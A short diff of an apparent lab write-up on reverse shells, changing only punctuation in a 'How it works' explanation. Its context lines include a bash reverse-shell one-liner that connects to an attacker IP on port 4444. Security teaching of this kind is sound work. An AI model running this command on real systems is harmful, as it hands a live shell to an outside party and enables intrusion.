@@ -76,7 +76,7 @@ On the **target machine**, execute the following command to connect back to the 
 bash -i >& /dev/tcp/192.168.248.130/4444 0>&1
 ```
 
-> **How it works:** This command opens a TCP connection to the attacker's IP on port `4444` and redirects standard input, output, and error — effectively handing a live bash shell to the attacker.
+> **How it works:** This command opens a TCP connection to the attacker's IP on port `4444` and redirects standard input, output, and error, effectively handing a live bash shell to the attacker.
 
 📸 **Screenshot — Reverse Shell Triggered:**
 
